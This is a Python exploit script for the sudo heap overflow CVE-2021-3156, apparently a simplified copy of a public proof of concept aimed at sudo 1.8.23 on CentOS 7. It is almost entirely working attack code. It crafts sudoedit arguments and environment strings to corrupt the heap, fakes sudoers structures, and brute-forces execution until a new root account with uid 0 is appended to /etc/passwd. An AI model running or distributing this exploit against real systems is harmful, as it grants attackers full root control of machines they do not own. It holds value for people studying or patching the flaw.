'''
Exploit for CVE-2021-3156 on CentOS 7 by sleepya
From https://github.com/worawit/CVE-2021-3156
Simplified version of exploit_userspec.py for easy understanding.
- Remove all checking code
- Fixed all offset (no auto finding)
Note: This exploit only work on sudo 1.8.23 on CentOS 7 with default configuration
Note: Disable ASLR before running the exploit (also modify STACK_ADDR_PAGE below) if you don't want to wait for bruteforcing
'''
import os
import sys
import resource
from struct import pack
from ctypes import cdll, c_char_p, POINTER
new_user = sys.argv[1]
new_hash = sys.argv[2]
SUDO_PATH = b"/usr/bin/sudo"  # can be used in execve by passing argv[0] as "sudoedit"
PASSWD_PATH = '/etc/passwd'
APPEND_CONTENT = new_user + ":" + new_hash + ":0:0:" + new_user + ":/root:/bin/bash\n"
APPEND_CONTENT = APPEND_CONTENT.encode('latin-1')
STACK_ADDR_PAGE = 0x7fffe5d35000
libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
def execve(filename, cargv, cenvp):
	libc.execve(filename, cargv, cenvp)
def spawn_raw(filename, cargv, cenvp):
	pid = os.fork()
	if pid:
		_, exit_code = os.waitpid(pid, 0)
		return exit_code
	else:
		execve(filename, cargv, cenvp)
		exit(0)
def spawn(filename, argv, envp):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(env))(*env)
	return spawn_raw(filename, cargv, cenvp)
resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
TARGET_CMND_SIZE = 0x1b50
argv = [ "sudoedit", "-A", "-s", PASSWD_PATH, "A"*(TARGET_CMND_SIZE-0x10-len(PASSWD_PATH)-1)+"\\", None ]
SA = STACK_ADDR_PAGE
ADDR_REFSTR = pack('<Q', SA+0x20) # ref string
ADDR_PRIV_PREV = pack('<Q', SA+0x10)
ADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec
ADDR_MEMBER_PREV = pack('<Q', SA+0x20)
ADDR_DEF_VAR = pack('<Q', SA+0x10)
ADDR_DEF_BINDING = pack('<Q', SA+0x30)
OFFSET = 0x30 + 0x20
ADDR_USER = pack('<Q', SA+OFFSET)
ADDR_MEMBER = pack('<Q', SA+OFFSET+0x40)
ADDR_CMND = pack('<Q', SA+OFFSET+0x40+0x30)
ADDR_PRIV = pack('<Q', SA+OFFSET+0x40+0x30+0x60)
epage = [
	'A'*0x8 + # to not ending with 0x00
	'\x21', '', '', '', '', '', '',
	ADDR_PRIV[:6], '',  # pointer to privilege
	ADDR_CMND[:6], '',  # pointer to cmndspec
	ADDR_MEMBER[:6], '',  # pointer to member
	'\x21', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '',  # members.first
	'A'*0x10 + # members.last, pad
	'\x41', '', '', '', '', '', '', # chunk metadata
	'', '', '', '', '', '', '', '',  # entries.tqe_next
	'A'*8 +  # entries.tqe_prev
	'', '', '', '', '', '', '', '',  # users.tqh_first
	ADDR_MEMBER[:6]+'', '', # users.tqh_last
	'', '', '', '', '', '', '', '',  # privileges.tqh_first
	ADDR_PRIV[:6]+'', '', # privileges.tqh_last
	'', '', '', '', '', '', '', '',  # comments.stqh_first
	'\x31', '', '', '', '', '', '', # chunk size , userspec.comments.stqh_last (can be any)
	'A'*8 + # member.tqe_next (can be any), userspec.lineno (can be any)
	ADDR_MEMBER_PREV[:6], '',  # member.tqe_prev, userspec.file (ref string)
	'A'*8 + # member.name (can be any because this object is not freed)
	pack('<H', 284), '',  # type, negated
	'A'*0xc+ # padding
	'\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
	'A'*0x8 + # entries.tqe_next
	ADDR_CMND_PREV[:6], '',  # entries.teq_prev
	'', '', '', '', '', '', '', '',  # runasuserlist
	'', '', '', '', '', '', '', '',  # runasgrouplist
	ADDR_MEMBER[:6], '',  # cmnd
	'\xf9'+'\xff'*0x17+ # tag (NOPASSWD), timeout, notbefore, notafter
	'', '', '', '', '', '', '', '',  # role
	'', '', '', '', '', '', '', '',  # type
	'A'*8 + # padding
	'\x51'*0x8 + # chunk metadata
	'A'*0x8 + # entries.tqe_next
	ADDR_PRIV_PREV[:6], '',  # entries.teq_prev
	'A'*8 + # ldap_role
	'A'*8 + # hostlist.tqh_first
	ADDR_MEMBER[:6], '',  # hostlist.teq_last
	'A'*8 +  # cmndlist.tqh_first
	ADDR_CMND[:6], '',  # cmndlist.teq_last
]
cnt = sum(map(len, epage))
padlen = 4096 - cnt - len(epage)
epage.append('P'*(padlen-1))
env = [
	"A"*(7+0x4010 + 0x110) + # overwrite until first defaults
	"\x21\\", "\\", "\\", "\\", "\\", "\\", "\\", 
	"A"*0x18 + 
	"\x41\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # next
	'a'*8 + # prev
	ADDR_DEF_VAR[:6]+'\\', '\\', # var
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", # val
	ADDR_DEF_BINDING[:6]+'\\', '\\', # binding
	ADDR_REFSTR[:6]+'\\', '\\',  # file
	"Z"*0x8 +  # type, op, error, lineno
	"\x31\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size (just need valid)
	'C'*0x638+  # need prev_inuse and overwrite until userspec
	'B'*0x1b0+
	"\x61\\", "\\", "\\", "\\", "\\", "\\", "\\", # chunk size
	ADDR_USER[:6]+'\\', '\\', # entries.tqe_next points to fake userspec in stack
	"A"*8 + # entries.tqe_prev
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",  # users.tqh_first
	ADDR_MEMBER[:6]+'\\', '\\', # users.tqh_last
	"\\", "\\", "\\", "\\", "\\", "\\", "\\", "",  # privileges.tqh_first
	"LC_ALL=C",
	"SUDO_EDITOR=/usr/bin/tee -a", # append stdin to /etc/passwd
	"TZ=:",
]
ENV_STACK_SIZE_MB = 4
for i in range(ENV_STACK_SIZE_MB * 1024 / 4):
	env.extend(epage)
env[-1] = env[-1][:-len(SUDO_PATH)-1-8]
env.append(None)
cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)
r, w = os.pipe()
os.dup2(r, 0)
w = os.fdopen(w, 'w')
w.write(APPEND_CONTENT)
w.close()
null_fd = os.open('/dev/null', os.O_RDWR)
os.dup2(null_fd, 2)
for i in range(16384):
	sys.stdout.write('%d\r' % i)
	if i % 8 == 0:
		sys.stdout.flush()
	exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
	if exit_code == 0:
		print("Success at %d" % i)
		break
else:
    print("Brute force failed")